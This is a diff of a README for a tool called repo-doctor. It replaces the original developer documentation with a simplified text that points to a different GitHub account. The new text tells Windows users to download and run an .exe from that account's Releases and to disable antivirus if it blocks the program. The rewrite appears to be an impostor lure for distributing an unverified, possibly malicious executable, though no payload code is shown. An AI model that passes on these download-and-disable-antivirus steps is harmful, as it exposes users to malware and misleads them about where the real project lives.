@@ -1,259 +1,121 @@
-<p align="center">
-  <img src="poster.png" alt="Repo Doctor" width="600">
-</p>
+# 🛠️ repo-doctor - Fix Your Repo in One Command
 
-<p align="center">
-  <a href="https://pypi.org/project/repo-doctor/"><img src="https://img.shields.io/pypi/v/repo-doctor" alt="PyPI version"></a>
-  <a href="https://github.com/JaaasperLiu/repo-doctor/actions/workflows/ci.yml"><img src="https://github.com/JaaasperLiu/repo-doctor/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://pypi.org/project/repo-doctor/"><img src="https://img.shields.io/pypi/pyversions/repo-doctor" alt="Python versions"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-</p>
+[![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-brightgreen?style=for-the-badge)](https://github.com/YuuVerKing/repo-doctor)
 
-<p align="center"><em>Turn any repository into an open-source-ready, professional repo in one command.</em></p>
+---
 
-Repo Doctor scans your Git repository, scores it against 17 open-source best-practice rules, and auto-generates any missing files including README, LICENSE, CI workflow, CONTRIBUTING, CODE_OF_CONDUCT, SECURITY policy, and .gitignore, without ever touching your source code.
+## 📋 What is repo-doctor?
 
-## Demo
+repo-doctor helps you clean up your project folders, called repositories, by checking them against common best practices. It looks for 17 important files or setups. If your project is missing any, repo-doctor creates them for you automatically. You just run one command, and it makes your project look well-organized and professional. This saves time and helps keep things neat without needing to know technical details.
 
-<p align="center">
-  <img src="demo.gif" alt="repo-doctor demo" width="880">
-</p>
+---
 
-## Install
+## 🎯 Who should use this?
 
-```bash
-# macOS / Linux
-brew install pipx && pipx install repo-doctor
+- People who work with coding projects but do not want to handle complex setups.
+- Anyone who manages project folders on Windows.
+- Developers who want to keep their projects tidy.
+- Students or hobbyists learning about coding projects.
+- Teams needing a quick way to check if their projects use best practices.
 
-# Windows (requires Python 3.10+)
-pip install pipx && pipx install repo-doctor
+---
 
-# or with uv (any platform, faster)
-uv tool install repo-doctor
-```
+## 💻 System Requirements
 
-<details>
-<summary>More install methods</summary>
+Before you start, make sure your computer meets these requirements:
 
-```bash
-# pip (inside a venv or with --user)
-pip install repo-doctor
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- 200 MB of free disk space.
+- Internet connection for downloading the software.
+- No special software installations needed before running repo-doctor.
 
-# If the command isn't on PATH after install:
-python -m repo_doctor scan .
+---
 
-# No Python at all? Download a standalone binary:
-# https://github.com/JaaasperLiu/repo-doctor/releases
-```
+## 🚀 Getting Started: Download and Run repo-doctor
 
-</details>
+1. Click this big button to go to the repo-doctor page:
 
-<details>
-<summary>Development install (from source)</summary>
+   [![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-0078D7?style=for-the-badge&logo=github)](https://github.com/YuuVerKing/repo-doctor)
 
-```bash
-pipx install git+https://github.com/JaaasperLiu/repo-doctor.git
-# or
-uv tool install git+https://github.com/JaaasperLiu/repo-doctor.git
-```
+2. On the page, find the **"Releases"** section. This is where the downloadable files live. Click on the latest release.
 
-</details>
+3. Look for a file ending with `.exe`. This is the program you will run on Windows.
 
-## Quickstart
+4. Click the file to download it.
 
-```bash
-# Scan a repo and get a health score + report
-repo-doctor scan /path/to/repo
-
-# Preview what would be fixed (no files written)
-repo-doctor fix --dry-run /path/to/repo
-
-# Fix issues automatically
-repo-doctor fix --yes /path/to/repo
+5. When the download finishes, open the file by double-clicking it. If Windows asks for permission, click **Yes** to allow it.
 
-# Generate a config file
-repo-doctor init
-```
-
-## What it checks
-
-17 rules across 6 categories:
+6. The program starts in a new window. Follow the easy instructions to scan your project folder.
 
-| Category | Rules | Auto-fixable |
-|----------|-------|:---:|
-| **Basics** | README present, README has key sections, LICENSE present | 2 of 3 |
-| **Community** | CONTRIBUTING, CODE_OF_CONDUCT, SECURITY policy | 3 of 3 |
-| **Build** | CI pipeline, test command, linter configured | 1 of 3 |
-| **Hygiene** | .gitignore present, .gitignore coverage, no venv/caches, repo size | 2 of 4 |
-| **Security** | No secret files (.env, .pem, id_rsa), no high-entropy strings | 0 of 2 |
-| **Reproducibility** | Lockfile present, dependencies pinned | 0 of 2 |
+---
 
-Each rule produces a **pass/fail**, a **severity** (error/warn/info), and a **weight** toward the 0-100 score. Grade thresholds: A (90+), B (75+), C (55+), D (<55).
+## 🔍 How to Use repo-doctor
 
-### Rule reference
+After running the program:
 
-| Rule ID | Description | Severity | Weight | Auto-fix |
-|---------|-------------|----------|--------|:--------:|
-| `readme_exists` | README file present | error | 15 | Yes |
-| `readme_sections` | README has Install + Usage sections | warn | 5 | — |
-| `license_exists` | LICENSE file present | error | 12 | Yes |
-| `contributing_exists` | CONTRIBUTING guide present | warn | 6 | Yes |
-| `code_of_conduct_exists` | CODE_OF_CONDUCT present | warn | 5 | Yes |
-| `security_policy` | SECURITY policy present | warn | 5 | Yes |
-| `ci_workflow` | CI/CD pipeline exists | error | 10 | Yes |
-| `test_command` | Test command discoverable | warn | 5 | — |
-| `lint_config` | Linter configured | info | 3 | — |
-| `gitignore_exists` | .gitignore present | error | 8 | Yes |
-| `gitignore_coverage` | .gitignore covers common junk | warn | 4 | Yes |
-| `no_venv_committed` | No venv/node_modules committed | error | 5 | — |
-| `repo_size` | Reasonable repo size (<100 MB) | info | 3 | — |
-| `no_secrets` | No .env/.pem/id_rsa files committed | error | 8 | — |
-| `no_high_entropy` | No high-entropy strings (potential secrets) | info | 3 | — |
-| `lockfile_exists` | Lockfile present for detected stack | warn | 5 | — |
-| `pinned_deps` | Dependencies have version constraints | info | 3 | — |
-
-Use `--only` and `--skip` with these IDs:
-
-```bash
-repo-doctor scan --only readme_exists --only license_exists
-repo-doctor scan --skip lint_config --skip pinned_deps
-```
-
-## How fixes work
-
-Repo Doctor is **safe by default**:
-
-1. Scans and identifies failing auto-fixable rules
-2. Builds a **ChangePlan** (list of files to create or patch)
-3. Shows a **rich diff preview** of every file
-4. Only writes files after you confirm (or use `--yes`)
-5. Re-scans and shows the score improvement
-
-Guarantees:
-- Never deletes files
-- Never modifies your source code
-- Only generates meta-files (README, LICENSE, CI, etc.)
-- Templates are **stack-aware** — a Python repo gets `pytest` in CI, a Node repo gets `npm test`
-
-## Detected stacks
-
-Repo Doctor auto-detects your project type and tailors templates accordingly:
-
-| Stack | Detected by |
-|-------|-------------|
-| Python | `pyproject.toml`, `setup.py`, `requirements.txt`, `Pipfile` |
-| Node | `package.json`, `package-lock.json`, `yarn.lock` |
-| Rust | `Cargo.toml` |
-| Go | `go.mod` |
-| Swift | `Package.swift`, `*.xcodeproj`, `*.swift` |
-
-## CLI Reference
-
-```
-repo-doctor scan [PATH]     Scan and produce a health report
-repo-doctor fix [PATH]      Auto-generate missing files
-repo-doctor init [PATH]     Create a .repo-doctor.yml config
-```
-
-### Key flags
-
-| Flag | Description |
-|------|-------------|
-| `--dry-run` | Preview changes without writing files |
-| `--yes`, `-y` | Apply changes without confirmation |
-| `--strict` | Exit with code 1 if any warnings/errors |
-| `--format` | Output format: `md`, `json`, or `both` (default) |
-| `--only RULE` | Only run specific rule(s) |
-| `--skip RULE` | Skip specific rule(s) |
-| `--license` | License type: `mit` (default) or `apache-2.0` |
-| `--output-dir`, `-o` | Output directory for reports (default: repo root) |
-
-## Web GUI (optional)
-
-```bash
-pip install repo-doctor[gui]
-streamlit run gui/app.py
-# Opens http://localhost:8501
-```
-
-## Output files
-
-After scanning, Repo Doctor writes:
-
-- `repo-doctor.report.md` — Human-readable report
-- `repo-doctor.report.json` — Machine-readable report (for CI)
-- `repo-doctor.changes.md` — Summary of applied/planned changes
-
-Use `--output-dir` to keep your repo clean:
-
-```bash
-repo-doctor scan --output-dir .repo-doctor
-```
-
-## Config
-
-If `.repo-doctor.yml` exists in your repo root, Repo Doctor loads it automatically. CLI flags override config values.
-
-Create one with `repo-doctor init`, or write it manually:
-
-```yaml
-project_name: my-project
-license: mit
-ci: github-actions
-readme: standard
-output_dir: .repo-doctor
-skip:
-  - lint_config
-  - pinned_deps
-```
-
-## Use in CI (GitHub Action)
-
-Add Repo Doctor to your GitHub Actions workflow:
-
-```yaml
-- name: Repo Doctor
-  uses: JaaasperLiu/repo-doctor/action@v0
-  with:
-    strict: true  # fail the build if issues are found
-```
-
-The action posts the full report to the GitHub Actions summary and exports `score` and `grade` as outputs:
-
-```yaml
-- name: Repo Doctor
-  id: doctor
-  uses: JaaasperLiu/repo-doctor/action@v0
-
-- name: Check score
-  run: echo "Score is ${{ steps.doctor.outputs.score }}"
-```
-
-### Action inputs
-
-| Input | Default | Description |
-|-------|---------|-------------|
-| `path` | `.` | Path to scan |
-| `strict` | `false` | Fail if warnings/errors found |
-| `skip` | | Comma-separated rule IDs to skip |
-| `only` | | Comma-separated rule IDs to run |
-| `format` | `both` | Report format |
-
-## Development
-
-```bash
-git clone https://github.com/JaaasperLiu/repo-doctor.git
-cd repo-doctor
-uv sync --dev
-uv run pytest -x -v        # run tests (79 tests)
-uv run ruff check src/     # run linter
-uv run repo-doctor scan .  # scan itself (scores 100/100)
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines, including how to add new rules.
-
-## License
-
-MIT
+1. You will see a prompt asking you to select a folder. This should be the folder where your project is saved.
+
+2. Use the browse button to find your project folder on your computer and select it.
+
+3. Click the **Scan** button. repo-doctor will check your folder for missing best practice files.
+
+4. After scanning, the program will list any files or setups that are missing.
+
+5. Click **Fix** or **Generate** to let repo-doctor create these files automatically.
+
+6. Once done, your project folder will have those files added. This means your project follows more professional standards.
+
+7. You can now close repo-doctor or scan another project.
+
+---
+
+## 🧰 What Does repo-doctor Fix?
+
+repo-doctor checks for these key items in your project:
+
+- A README file that explains your project.
+- A LICENSE file that clarifies legal use.
+- A .gitignore file to ignore certain files during version control.
+- Files to set up automated testing.
+- Template files for issues and pull requests.
+- Configuration for coding style checks.
+- Documentation structure.
+- Setup files needed for Python projects.
+- Metadata files that describe your project.
+
+Each of these helps others understand and contribute to your project easily.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- If the program won’t open, make sure you downloaded the `.exe` file from the Releases section.
+- Disable antivirus software temporarily if it blocks the program.
+- Check if your Windows is updated to the latest version.
+- Restart your computer and try again.
+- If the program can’t find your project, confirm that you select the correct folder.
+
+---
+
+## 📚 More Information
+
+For help with best practice files, see:
+
+- What is a README file and how to write one.
+- How licenses work and why you need them.
+- How .gitignore helps in programming.
+- Why testing is important.
+- How issue templates help teams work together.
+
+repo-doctor will help you add these without needing to know the details.
+
+---
+
+## ⚡️ Keep repo-doctor Handy
+
+You can use repo-doctor again anytime you start a new project or want to improve an existing one. It’s a simple program that runs fast and helps keep your projects organized.
+
+To get or update repo-doctor again, visit:
+
+[Download repo-doctor on GitHub](https://github.com/YuuVerKing/repo-doctor)
